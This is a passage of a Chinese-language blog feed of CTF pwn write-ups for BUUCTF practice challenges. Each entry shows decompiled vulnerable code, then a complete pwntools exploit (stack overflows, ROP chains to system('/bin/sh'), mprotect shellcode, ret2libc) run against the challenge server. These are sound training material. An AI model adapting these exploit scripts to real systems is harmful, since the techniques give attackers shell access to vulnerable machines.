class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span>*<span class="string">&#x27;a&#x27;</span>+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)</span><br><span class="line"><span class="comment">#Ubuntu18调用system时要ret，不然会crash</span></span><br><span class="line"><span class="comment">#栈对齐</span></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><h2 id="0xC-jarvisoj-level2"><a href="#0xC-jarvisoj-level2" class="headerlink" title="0xC.jarvisoj_level2"></a>0xC.jarvisoj_level2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ file level2 </span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br><span class="line"></span><br><span class="line">gwt@ubuntu:~/Desktop$  checksec level2 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/level2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>没后门函数，重要的部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有/bin/sh字符串。而且没开PIE，字符串的地址不会变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level2&quot;)</span></span><br><span class="line"><span class="comment">#node3.buuoj.cn:28929</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28929</span>)</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh = 0x0804A024</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> +p32(sys_plt)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xD-ciscn-2019-n-8"><a href="#0xD-ciscn-2019-n-8" class="headerlink" title="0xD.ciscn_2019_n_8"></a>0xD.ciscn_2019_n_8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_8&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29560</span> )</span><br><span class="line">io.recv() </span><br><span class="line">payload = p32(<span class="number">17</span>) * <span class="number">14</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xE-not-the-same-3dsctf-2016"><a href="#0xE-not-the-same-3dsctf-2016" class="headerlink" title="0xE.not_the_same_3dsctf_2016"></a>0xE.not_the_same_3dsctf_2016</h2><p>就两个有用的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和get_started_3dsctf_2016一样，用mprotect修改内存的权限。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29052</span>)</span><br><span class="line">pop_ret = <span class="number">0x08050b45</span></span><br><span class="line"><span class="comment">#pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line">mem_addr = <span class="number">0x80ec000</span> </span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x2d</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xF-bjdctf-2020-babystack"><a href="#0xF-bjdctf-2020-babystack" class="headerlink" title="0xF.bjdctf_2020_babystack"></a>0xF.bjdctf_2020_babystack</h2><p>有个后门函数。主程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000010 buf             db 12 dup(?)</span><br><span class="line">-0000000000000004 nbytes          dq ?</span><br><span class="line">+0000000000000004                 db ? ; undefined</span><br><span class="line">+0000000000000005                 db ? ; undefined</span><br><span class="line">+0000000000000006                 db ? ; undefined</span><br><span class="line">+0000000000000007                 db ? ; undefined</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>这个题，两个思路吧（其实是一样的），一个就是将输入的nbytes开大一点，直接可以覆盖到返回地址。</p><p>或者就是整数溢出，根据size_t与unsigned int的不同来做（其实也是将nbytes(buf)开的很大，覆盖返回地址）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babystack&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26217</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">back_door = <span class="number">0x004006E6</span> </span><br><span class="line">io.sendline(<span class="string">&quot;100&quot;</span>)<span class="comment">#或者这里改为-1</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(back_door)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x1-test-your-nc&quot;&gt;&lt;a href=&quot;#0x1-test-your-nc&quot; class=&quot;headerlink&quot; title=&quot;0x1.test_your_nc&quot;&gt;&lt;/a&gt;0x1.test_your_nc&lt;/h2&gt;&lt;p&gt;nc一下就完事。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWN刷题_0x10-0x1F</title>
    <link href="http://example.com/2021/06/01/BUU-PWN-0x10-0x1F/"/>
    <id>http://example.com/2021/06/01/BUU-PWN-0x10-0x1F/</id>
    <published>2021-05-31T16:00:00.000Z</published>
    <updated>2021-07-20T12:38:37.865Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="0x10-HarekazeCTF2019-baby-rop"><a href="#0x10-HarekazeCTF2019-baby-rop" class="headerlink" title="0x10.[HarekazeCTF2019]baby_rop"></a>0x10.[HarekazeCTF2019]baby_rop</h2><p>没后门函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./babyrop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28280</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">sys_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi_ret =<span class="number">0x0400683</span></span><br><span class="line">bin_sh = <span class="number">0x0601048</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x11-jarvisoj-level2-x64"><a href="#0x11-jarvisoj-level2-x64" class="headerlink" title="0x11.jarvisoj_level2_x64"></a>0x11.jarvisoj_level2_x64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有/bin/sh字符串，没啥写的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./level2_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28783</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0004006b3</span></span><br><span class="line">bin_sh = <span class="number">0x00600A90</span></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span> +p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x12-ciscn-2019-n-5"><a href="#0x12-ciscn-2019-n-5" class="headerlink" title="0x12.ciscn_2019_n_5"></a>0x12.ciscn_2019_n_5</h2><p>啥都没开，刺激。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_5</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以ret2libc或者ret2shellcode</p><p>这里要加架构名称，不然报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_5&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28410</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload_add = <span class="number">0x0601080</span></span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(payload_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注意Ubuntu18的话要加一个ret栈对齐</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_n_5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node3.buuoj.cn&#x27;,28410)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x00400713</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="number">11</span>)</span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(sys_addr)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x13-ciscn-2019-ne-5"><a href="#0x13-ciscn-2019-ne-5" class="headerlink" title="0x13.ciscn_2019_ne_5"></a>0x13.ciscn_2019_ne_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 